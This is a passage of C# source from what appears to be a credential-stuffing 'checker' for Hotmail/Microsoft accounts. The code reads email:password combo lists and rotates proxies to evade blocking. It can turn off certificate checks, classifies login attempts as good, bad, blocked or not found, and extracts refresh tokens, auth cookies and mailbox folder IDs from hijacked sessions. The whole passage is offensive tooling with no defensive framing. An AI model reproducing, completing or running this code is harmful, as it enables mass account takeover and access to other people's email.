                    if (items.ValueKind != JsonValueKind.Array || items.GetArrayLength() == 0) return null;
                    var first = items[0];
                    if (first.TryGetProperty("Folders", out var folders)
                        && folders.ValueKind == JsonValueKind.Array
                        && folders.GetArrayLength() > 0)
                    {
                        var folder = folders[0];
                        if (folder.TryGetProperty("FolderId", out var folderId)
                            && folderId.TryGetProperty("Id", out var idProp))
                            return idProp.GetString();
                    }
                }
                catch { }
                return null;
            }

            var inbox  = await TryGetFolderAsync("inbox").ConfigureAwait(false);
            var sent   = await TryGetFolderAsync("sentitems").ConfigureAwait(false);
            var drafts = await TryGetFolderAsync("drafts").ConfigureAwait(false);
            return new StartupDataResult(true, inbox, sent, drafts, null);
        }

        private static string? FindFolderIdRecursive(JsonElement element, string targetDistId)
        {
            if (element.ValueKind == JsonValueKind.Object)
            {
                if (element.TryGetProperty("DistinguishedFolderId", out var dist)
                    && dist.ValueKind == JsonValueKind.String)
                {
                    if (string.Equals(dist.GetString(), targetDistId, StringComparison.OrdinalIgnoreCase))
                    {
                        if (element.TryGetProperty("Id",       out var id))  return id.GetString();
                        if (element.TryGetProperty("FolderId", out var fid)
                            && fid.TryGetProperty("Id",        out var id2)) return id2.GetString();
                    }
                }
                foreach (var prop in element.EnumerateObject())
                {
                    var res = FindFolderIdRecursive(prop.Value, targetDistId);
                    if (!string.IsNullOrWhiteSpace(res)) return res;
                }
            }
            else if (element.ValueKind == JsonValueKind.Array)
            {
                foreach (var item in element.EnumerateArray())
                {
                    var res = FindFolderIdRecursive(item, targetDistId);
                    if (!string.IsNullOrWhiteSpace(res)) return res;
                }
            }
            return null;
        }

        private static string? FindPuidRecursive(JsonElement element)
        {
            if (element.ValueKind == JsonValueKind.Object)
            {
                if (element.TryGetProperty("UserPuid", out var puid) && puid.ValueKind == JsonValueKind.String)
                    return puid.GetString();
                foreach (var prop in element.EnumerateObject())
                {
                    var res = FindPuidRecursive(prop.Value);
                    if (!string.IsNullOrWhiteSpace(res)) return res;
                }
            }
            else if (element.ValueKind == JsonValueKind.Array)
            {
                foreach (var item in element.EnumerateArray())
                {
                    var res = FindPuidRecursive(item);
                    if (!string.IsNullOrWhiteSpace(res)) return res;
                }
            }
            return null;
        }

        private static bool ContainsNotFound(string? html)
        {
            if (string.IsNullOrWhiteSpace(html)) return false;
            return html.IndexOf("That Microsoft account doesn't exist", StringComparison.OrdinalIgnoreCase) >= 0;
        }

        private static bool ContainsBad(string? html)
        {
            if (string.IsNullOrWhiteSpace(html)) return false;
            return html.IndexOf("Your account or password is incorrect",   StringComparison.OrdinalIgnoreCase) >= 0
                || html.IndexOf("The account or password is incorrect",    StringComparison.OrdinalIgnoreCase) >= 0
                || html.IndexOf("Bad user credential",                      StringComparison.OrdinalIgnoreCase) >= 0;
        }

        private static bool ContainsBlocked(string? html, string? location, IEnumerable<string> triggers)
        {
            foreach (var t in triggers)
            {
                if (!string.IsNullOrWhiteSpace(html)     && html.IndexOf(t,     StringComparison.OrdinalIgnoreCase) >= 0) return true;
                if (!string.IsNullOrWhiteSpace(location) && location.IndexOf(t, StringComparison.OrdinalIgnoreCase) >= 0) return true;
            }
            return false;
        }

        private static string? ExtractRefreshToken(string location, string? html)
        {
            var htmlText = html ?? string.Empty;
            var token = FindBetween(location, "rtoken=",           "&");
            if (string.IsNullOrWhiteSpace(token)) token = FindBetween(location, "#rtoken=",         "&");
            if (string.IsNullOrWhiteSpace(token)) token = FindBetween(htmlText, "rtoken=",          "&");
            if (string.IsNullOrWhiteSpace(token)) token = FindBetween(htmlText, "refreshtoken\":\"", "\"");
            return string.IsNullOrWhiteSpace(token) ? null : WebUtility.UrlDecode(token);
        }

        private static string? ExtractRegexGroup(Regex regex, string input)
        {
            var match = regex.Match(input ?? string.Empty);
            if (!match.Success) return null;
            for (var i = 1; i < match.Groups.Count; i++)
            {
                var v = match.Groups[i].Value;
                if (!string.IsNullOrWhiteSpace(v)) return v;
            }
            return null;
        }

        private static string FindBetween(string source, string start, string end)
        {
            if (string.IsNullOrEmpty(source)) return string.Empty;
            var startIndex = source.IndexOf(start, StringComparison.OrdinalIgnoreCase);
            if (startIndex < 0) return string.Empty;
            startIndex += start.Length;
            var endIndex = source.IndexOf(end, startIndex, StringComparison.OrdinalIgnoreCase);
            if (endIndex < 0) return string.Empty;
            return source.Substring(startIndex, endIndex - startIndex);
        }

        private static string? GetValueFromHtml(string name, string html)
        {
            if (string.IsNullOrWhiteSpace(html)) return null;
            var m = Regex.Match(html, "name=[\"']" + Regex.Escape(name) + "[\"']\\s*value=[\"']([^\"']+)[\"']");
            if (m.Success) return m.Groups[1].Value;
            var m2 = Regex.Match(html, "\"" + Regex.Escape(name) + "\":\"([^\"]+)\"");
            if (m2.Success) return m2.Groups[1].Value;
            return null;
        }

        private static string? GetCookieValue(CookieContainer container, Uri uri, string name)
        {
            try
            {
                foreach (Cookie cookie in container.GetCookies(uri))
                    if (string.Equals(cookie.Name, name, StringComparison.OrdinalIgnoreCase))
                        return cookie.Value;
            }
            catch { }
            return null;
        }

        private static bool HasAuthCookie(CookieContainer container, Uri uri)
            => !string.IsNullOrWhiteSpace(GetCookieValue(container, uri, "__Sec-MSAAUTH"))
            || !string.IsNullOrWhiteSpace(GetCookieValue(container, uri, "MSPAuthToken"));

        private static bool TrySplitAccount(string line, out string email, out string password)
        {
            email = password = string.Empty;
            if (string.IsNullOrWhiteSpace(line)) return false;
            var parts = line.Split(new[] { ':' }, 2);
            if (parts.Length != 2) return false;
            email    = parts[0].Trim();
            password = parts[1].Trim();
            return email.Length > 0 && password.Length > 0;
        }

        private static string GetUserAgent()
            => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

        private void SaveRebruteHtml(string email, string html)
        {
            if (string.IsNullOrWhiteSpace(_rebruteHtmlDir) || string.IsNullOrWhiteSpace(html)) return;
            try
            {
                var safeEmail = email.Replace('@', '_').Replace('.', '_');
                File.WriteAllText(Path.Combine(_rebruteHtmlDir, $"{safeEmail}.html"), html, Encoding.UTF8);
            }
            catch { }
        }

        private static SocketsHttpHandler CreateHandler(ProxyInfo? proxy, bool useCookies, TimeSpan? connectTimeout, bool ignoreSsl)
        {
            var handler = new SocketsHttpHandler
            {
                AllowAutoRedirect      = false,
                UseCookies             = useCookies,
                CookieContainer        = new CookieContainer(),
                AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate
            };

            if (connectTimeout.HasValue)
                handler.ConnectTimeout = connectTimeout.Value;

            if (ignoreSsl)
                handler.SslOptions.RemoteCertificateValidationCallback = (_, _, _, _) => true;

            if (proxy != null)
            {
                handler.UseProxy = true;
                handler.Proxy    = proxy.ToWebProxy();
            }

            return handler;
        }

        private static string ResolveNearAppOrAbsolute(string path)
        {
            if (string.IsNullOrWhiteSpace(path)) return path;
            if (Path.IsPathRooted(path)) return path;

            var baseDir = AppContext.BaseDirectory;
            try
            {
                if (!string.IsNullOrWhiteSpace(Environment.ProcessPath))
                {
                    var exeDir = Path.GetDirectoryName(Environment.ProcessPath);
                    if (!string.IsNullOrWhiteSpace(exeDir))
                        baseDir = exeDir;
                }
            }
            catch { }

            return Path.Combine(baseDir, path);
        }

        private static string CreateResultDir()
        {
            var baseDir = AppContext.BaseDirectory;
            try
            {
                if (!string.IsNullOrWhiteSpace(Environment.ProcessPath))
                {
                    var exeDir = Path.GetDirectoryName(Environment.ProcessPath);
                    if (!string.IsNullOrWhiteSpace(exeDir))
                        baseDir = exeDir;
                }
            }
            catch { }
            return Path.Combine(baseDir, "Result", $"Hotmail_{DateTime.Now:yyyyMMdd_HHmmss}");
        }

        private static List<string> LoadAccounts(string path)
        {
            var list = new List<string>();
            foreach (var line in File.ReadLines(path))
            {
                var trimmed = line.Trim();
                if (string.IsNullOrWhiteSpace(trimmed) || !trimmed.Contains(':')) continue;
                list.Add(trimmed);
            }
            return list;
        }

        private static List<ProxyInfo> LoadProxies(string path, string? defaultProtocol)
        {
            var list      = new List<ProxyInfo>();
            var scheme    = (defaultProtocol ?? "Socks5").Trim();
            var useHttp   = scheme.Equals("http",  StringComparison.OrdinalIgnoreCase)
                         || scheme.Equals("https", StringComparison.OrdinalIgnoreCase);
            var defaultScheme = useHttp ? "http" : "socks5";
            foreach (var line in File.ReadLines(path))
            {
                var raw    = line.Trim();
                if (string.IsNullOrWhiteSpace(raw)) continue;
                var parsed = ProxyInfo.TryParse(raw, defaultScheme, forceScheme: true);
                if (parsed != null) list.Add(parsed);
            }
            return list;
        }

        private sealed record StartupDataResult(bool Success, string? InboxId, string? SentId, string? DraftsId, string? Puid)
        {
            public static StartupDataResult Empty => new(false, null, null, null, null);
        }

        private sealed record WorkItem(int Index, string Account);

        private sealed class ProxyInfo
        {
            public string  Scheme   { get; }
            public string  Host     { get; }
            public int     Port     { get; }
            public string? Username { get; }
            public string? Password { get; }

            private ProxyInfo(string scheme, string host, int port, string? username, string? password)
            {
                Scheme   = scheme;
                Host     = host;
                Port     = port;
                Username = username;
                Password = password;
            }

            public static ProxyInfo? TryParse(string raw, string defaultScheme, bool forceScheme)
            {
                if (string.IsNullOrWhiteSpace(raw)) return null;
                var cleaned = raw.Trim();

                if (cleaned.Contains("://", StringComparison.Ordinal))
                {
                    if (!Uri.TryCreate(cleaned, UriKind.Absolute, out var uri)) return null;
                    var scheme = forceScheme ? defaultScheme : uri.Scheme.ToLowerInvariant();
                    var host   = uri.Host;
                    var port   = uri.Port > 0 ? uri.Port : (scheme.Contains("socks") ? 1080 : 8080);
                    string? user = null, pass = null;
                    if (!string.IsNullOrWhiteSpace(uri.UserInfo))
                    {
                        var parts = uri.UserInfo.Split(':', 2);
                        user = parts[0];
                        if (parts.Length > 1) pass = parts[1];
                    }
                    return new ProxyInfo(scheme, host, port, user, pass);
                }

                if (!TryParseNoScheme(cleaned, out var host2, out var port2, out var user2, out var pass2))
                    return null;

                var parsedScheme = string.IsNullOrWhiteSpace(defaultScheme) ? "http" : defaultScheme;
                return new ProxyInfo(parsedScheme, host2, port2, user2, pass2);
            }

            private static bool TryParseNoScheme(string value, out string host, out int port, out string? user, out string? pass)
            {
                host = string.Empty; port = 0; user = null; pass = null;
                var line = value.Trim();
                if (string.IsNullOrWhiteSpace(line)) return false;

                var atIdx = line.LastIndexOf('@');
                if (atIdx > 0)
                {
                    var creds    = line.Substring(0, atIdx);
                    var hostPort = line.Substring(atIdx + 1);
                    var c = creds.Split(new[] { ':' }, 2);
                    user = c[0];
                    pass = c.Length > 1 ? c[1] : string.Empty;
                    return TryParseHostPort(hostPort, out host, out port);
                }

                var parts = line.Split(':');
                if (parts.Length == 4 && int.TryParse(parts[1], out port))
                {
                    host = parts[0]; user = parts[2]; pass = parts[3];
                    return !string.IsNullOrWhiteSpace(host);
                }

                return TryParseHostPort(line, out host, out port);
            }

            private static bool TryParseHostPort(string value, out string host, out int port)
            {
                host = string.Empty; port = 0;
                var lastColon = value.LastIndexOf(':');
                if (lastColon <= 0 || lastColon == value.Length - 1) return false;
                host = value.Substring(0, lastColon).Trim();
                var portStr = value.Substring(lastColon + 1).Trim();
                if (string.IsNullOrWhiteSpace(host) || !int.TryParse(portStr, out port)) return false;
                return true;
            }

            public IWebProxy ToWebProxy()
            {
                if (Scheme.StartsWith("socks", StringComparison.OrdinalIgnoreCase))
                    return new HttpToSocks5Proxy(Host, Port, Username, Password);

                var proxy = new WebProxy(Host, Port);
                if (!string.IsNullOrWhiteSpace(Username))
                    proxy.Credentials = new NetworkCredential(Username, Password ?? string.Empty);
                return proxy;
            }
        }

        private sealed record HotmailAuthResult(HotmailStatus Status, string AccountLine)
        {
            public string? AccessToken { get; init; }
            public string? Puid        { get; init; }
        }

        private enum HotmailStatus { Good, Bad, Blocked, NotFound, Rebrute, Error }
    }
}
